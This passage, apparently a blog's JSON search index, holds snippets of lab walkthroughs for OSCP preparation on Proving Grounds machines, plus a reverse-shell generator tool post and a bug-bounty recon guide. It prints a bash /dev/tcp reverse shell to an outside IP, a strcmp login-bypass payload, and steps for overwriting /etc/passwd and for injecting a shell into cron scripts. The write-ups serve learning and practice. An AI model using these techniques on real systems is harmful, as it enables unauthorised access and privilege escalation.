the system by overwriting /etc/passwd file using wget: copying /etc/passwd file to our attack machine. creating new user named bingo with password pwned using openssl: adding the new user to the downloaded passwd file: uploading the new passwd file to the target machine and overwriting the remote /etc/passwd using wget: Happy Hacking!" }, { "title": "Funbox Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-funbox/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, wordpress, misc, privilege escalation, linux", "date": "2021-12-12 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called Funbox and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Enumerating users on Wordpress running on port 80 using wpscan: wpscan --url http://funbox.fritz.box/ -e u1-20 Valid wordpress users: Dictionary attack on ssh using hydra:Privilege Escalation: Checking funny user home directory: As shown in the picture above the script .backup.sh is writable by anyone on the box and it keeps running doing backup to /var/www/html Exploit .backup.sh script: Generating bash reverse shell payload: Injecting the payload to .backup.sh script: Wainting for a few minutes and boom!:Happy Hacking!" }, { "title": "Tools - Reverse Shell Generator Bash Script.", "url": "/posts/reverse-shell-generator/", "categories": "Tools, Bash", "tags": "reverse shell, netcat", "date": "2021-12-11 11:33:00 +0000", "snippet": "Hello,After spending a lot of time doing HackTheBox, Vulnhub and OffSec PG, I found that it’s so annoying to keep losing the reverse shell and I have to visit Pentestmonkey or PayloadAllTheThings Reverse Shell Cheatsheet over and over again, so I made this script Reverse Shell Generator to make it easy and fast for getting Reverse shell payloads (Python, Netcat, BASH, PHP) with encoding (urlencode, base64) and Starting local Netcat listener without being worried about which port to use.Usage:./payload.sh -hThis will display the help and the options that you can use:#OPTIONS: -t, --type - Payload Type [python, netcat, bash, php]. -i, --ip - Local IP. -p, --port - Local Port. -r, --run - Run Netcat Listener. -e, --encode - Encode The Payload [base64, url]. -I, --interface - Get The IP From Specific Interface (Default: tun0). -h, --help - Prints The Help and Exit. Basic Usage:if you just run the tool without options it will gives you a bash reverse shell with the ip of tun0 Network Interface and a random port number:$ payloadbash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.111/33381 0&amp;gt;&amp;amp;1 Getting Netcat Payload with base64 encoding, the IP form eth0 Interface and starting local netcat listener: You can specify the IP and PORT manually: The tool on github: https://github.com/bing0o/Reverse_Shell_GeneratorHappy Hacking!" }, { "title": "BTRSys2.1 Medium box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-btrsys2-1/", "categories": "OSCP, Proving Grounds", "tags": "oscp medium box, PG medium box, enumeration, misc, mysql, privilege escalation, sudo, linux", "date": "2021-12-10 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds Medium machines which called BTRSys2.1 and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap:Getting Shell: Wordpress running on port 80, you can login with Creds: User: admin Pass: admin Edit the theme and add your payload to any writable php file: Access the shell:Privilege Escalation: Mysql Creds:found in wp-config.php for wordpress:/** MySQL database username */define(&#39;DB_USER&#39;, &#39;root&#39;);/** MySQL database password */define(&#39;DB_PASSWORD&#39;, &#39;rootpassword!&#39;);Enumerating Mysql: Databases: +--------------------+| Database |+--------------------+| information_schema || deneme || mysql || performance_schema || phpmyadmin || sys || wordpress |+--------------------+ Explore wordpress DB: mysql&amp;gt; use wordpress;mysql&amp;gt; show tables;+----------------------------+| Tables_in_wordpress |+----------------------------+| wp_abtest_experiments |...| wp_usermeta || wp_users |+----------------------------+ Getting password for btrisk user then getting root:Happy Hacking!" }, { "title": "Sar Easy box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-sar-box/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, cve, privilege escalation, cron, linux", "date": "2021-12-09 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds easy machines which called Sar and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: Getting Shell: The port 80 is running sar2HTML application:Privilege Escalation: Running LinEnum: Exploiting cronjob and getting root on the box: Reverse Shell: I used this script to generate Reverse Shell and running a netcat listener:Happy Hacking!" }, { "title": "Potato Easy box on Offensive Security Proving Grounds - OSCP Preparation.", "url": "/posts/pg-potato-box/", "categories": "OSCP, Proving Grounds", "tags": "oscp easy box, PG easy box, enumeration, strcmp, privilege escalation, sudo, linux", "date": "2021-12-08 11:33:00 +0000", "snippet": "Hello,We are going to exploit one of OffSec Proving Grounds easy machines which called Potato and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.Enumeration: Nmap: FTP Anon Login: Content of index.php.bak file: &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;?php$pass= &quot;potato&quot;; //note Change this password regularlyif($_GET[&#39;login&#39;]===&quot;1&quot;){ if (strcmp($_POST[&#39;username&#39;], &quot;admin&quot;) == 0 &amp;amp;&amp;amp; strcmp($_POST[&#39;password&#39;], $pass) == 0) { echo &quot;Welcome! &amp;lt;/br&amp;gt; Go to the &amp;lt;a href=\\&quot;dashboard.php\\&quot;&amp;gt;dashboard&amp;lt;/a&amp;gt;&quot;; setcookie(&#39;pass&#39;, $pass, time() + 365*24*3600); }else{ echo &quot;&amp;lt;p&amp;gt;Bad login/password! &amp;lt;/br&amp;gt; Return to the &amp;lt;a href=\\&quot;index.php\\&quot;&amp;gt;login page&amp;lt;/a&amp;gt; &amp;lt;p&amp;gt;&quot;; } exit();}?&amp;gt; &amp;lt;form action=&quot;index.php?login=1&quot; method=&quot;POST&quot;&amp;gt; &amp;lt;h1&amp;gt;Login&amp;lt;/h1&amp;gt; &amp;lt;label&amp;gt;&amp;lt;b&amp;gt;User:&amp;lt;/b&amp;gt;&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;username&quot; required&amp;gt; &amp;lt;/br&amp;gt; &amp;lt;label&amp;gt;&amp;lt;b&amp;gt;Password:&amp;lt;/b&amp;gt;&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;password&quot; name=&quot;password&quot; required&amp;gt; &amp;lt;/br&amp;gt; &amp;lt;input type=&quot;submit&quot; id=&#39;submit&#39; value=&#39;Login&#39; &amp;gt; &amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Authentication Bypass:So if you get a close look at the source code above you will notice that the application uses strcmp on line 8 to check for the username and password and that can be bypassed with username[]=&quot;&quot;&amp;amp;password[]=&quot;&quot; like shown bellow. Exploit Local File Inclusion (LFI):As you can see in the picture bellow there’s a password for the user webadmin in /etc/passwd: Crack the password for webadmin user using john:Privilege Escalation: sudo -l: Getting root: Happy Hacking!" }, { "title": "Doing Recon on a Large Scope", "url": "/posts/doing-recon/", "categories": "bug hunting, recon", "tags": "bug hunting, recon, enumeration, OSINT", "date": "2020-04-08 11:33:00 +0000", "snippet": "hello Hackers, this is the first post on my blog and I hope it will be useful for some of you, I’m gonna talk about Recon on Targets with a large scope and how to collect its domains, subdomains and IPs.Why Recon!As you all know Recon is the first stage when you’re doing a penetration testing or bug hunting, and if you can get an information ( domain/ip/github account … and so on) other hackers didn’t reach to it yet, it’s a great advantage for you to exploit it before other hackers and get a bounty, sounds great right! :D, it’s all based on your Recon-fu, also always keep you data organized and easy to reach, because these days there’s a lot of vulnerabilities being found by security researchers and when the POC is published you have to be ready to find some of your targets vulnerable to it, take care of your recon data and it will take care of you, trust me.our recon will go through 3 stages: Finding SubDomains. Finding Domains related to the same Target. Finding IPs.Finding SubDomains:let’s say our target is target.com and we want to get all possible subdomains like api.target.com and admin.target.com … Etc, there’s a lot of tools to do that but i’m gonna pick some of them ( based on my own opinion ), and we’re gonna use a bash script to use these tools and combine the results and sort them into one file!Automate The Process: Automation is your best friend ;)so we’re gonna use 4 tools and 3 APIs: Tools: Findomain SubFinder Amass AssetFinder APIs: WayBackMachine crt.sh BufferOver basically, you can use each tool or API separated, then combine the results, but this gonna take time and not productive for me.so I made a bash script to automate this and make it easier and faster, you can use a specific tools or exclude a specific one as you like: SubEnumthis tool will be enough to get all the possible subdomains.also running a brute force tool like knockpy is a good idea to find more subdomains especially if you use a custom wordlist.Finding Domains related To The Same Organization:this means if the main domain of our target is target.com and we got all the subdomains of that domain in the previous stage, but maybe our target own other domains like target.net, targetshop.com … etc, we need to find those too.in this stage we’re gonna use a reverse whois lookup, first we do a normal whois against target.com, usually i use viewdns.info to get the Registrant (Name OR Email Address), we’re gonna need one or both of this informations to do a reverse whois lookup and get all the domains that registred using that name or email address (Email Address Recommended here).Let’s use some APIs to collect the domains: viewdns.info: this website is good but it gives you only the first 500 results for free and you have to pay for the rest, so if your target has more than that as domains, it’s not good for you. whoisxmlapi.com: I used this API lately and I liked it, it’s free and very good, but I’m not sure if it’s limited or not!, but at least it does the job :). Let’s bash it:since we’re gonna use whoisxmlapi.com API, first you have to create an account and get your API KEY.let’s make a bash scrip to get the results:#!/bin/bash#check if the first argument doesn&#39;t exist.[ -z &quot;$1&quot; ] &amp;amp;&amp;amp; { echo &quot;[!] ./alldomains.sh &amp;lt;Registrare Email/Name&amp;gt;&quot;; exit 1; }curl -s -XPOST https://reverse-whois-api.whoisxmlapi.com/api/v2 -d \\&quot;{\\&quot;apiKey\\&quot;: \\&quot;YOUR_API_KEY\\&quot;,\\&quot;mode\\&quot;: \\&quot;purchase\\&quot;,\\&quot;basicSearchTerms\\&quot;: {\\&quot;include\\&quot;: [\\&quot;$1\\&quot;]}}&quot; | tr &#39;,\\|[&#39; &#39;\\n&#39; | cut -d &#39;&quot;&#39; -f 2 | grep -v &quot;domainsCount\\|domainsList&quot;don’t forget to change YOUR_API_KEY with your API key :)save this in a file then run:./alldomains.sh domains@target.com &amp;gt; domains.txt PS: domains@target.com we got this from the previous stage (whois lookup)here don’t forget that you have to do the first stage again subdomains finding with this new domains, and get more results … It gets bigger :D.I want to mention that this script SubEnum is able to use a list of domains, so you can just feed your list of domains to this tool and you don’t have to use all the tools and APIs to make it faster, like this:Finding IPs:here’s two ways to get list of IPs:Using Amass:you can use amass to get the IP for each subdomain or domain you find using this tool like this:amass enum -d target.com -ip -o results.txt this will give you the IP of each SubDomain and save the results in results.txt file.Using ASN:Recomendedfirst you need the ip address of your target.com, then use this site to get autonomous system number (ASN), we’re gonna use this number to get a bunch of CIDRs owned by our target,Enter the IP address in the search bar and you will get something like this:   Announced By   Origin AS Announcement Description AS1X1 192.168.32.0/19 Target Services, Inc the result of Announcement is The CIDR, click on the result of Origin AS you will find some more AS numbers related to the organization, but be carefull, don’t get out of scope, if your scope only for Target Services. Inc , you have to exclude Target Corp, Inc …. etc.let’s bash it:as always i can’t do this boring stuff without automation, this is a bash script ASNenum.sh, it takes two kind of arguments, IP or ASN, if you enter an IP it will gives you the ASN and one CIDR of the entred IP that awned by your target organization, if you enter ASN the result will be a list of CIDRs, but The manuall way gives you more results.and here is a python script if you want to translate CIDR to a list of IPs:#!/usr/bin/env pythonimport ipaddress, systry: cidr = sys.argv[1]except: print(&quot;[!] Usage: ips &amp;lt;CIDR&amp;gt;&quot;) exit(1)ips = ipaddress.ip_network(unicode(str(cidr)))for ip in ips: print(ip)lately i found more than 380+ CIDR for my target, the list of IPs got more than 44 million IP, of course not all of them are up, and i had to filter them, but hey with tools like masscan and zmap it’s not a problem at all it tooks just a few minutes to go through the entire list and scan ports 80,443 :Dconclusion:well, let’s see: Finding the SubDomains: Done. Finding domains: Done. Finding IPs: Done.we didn’t go deep in our recon, i think it’s enough at this point , next time we will talk about how to deal with all of this data, and filter this results, to find your entry point and start the real job :D.if you learnt something from this post please let me learn something from you too, if you have any recommandation or question leave it in the comments section, or find me on twitter.don’t forget to share everywhere :D.Happy Hacking!" } ]
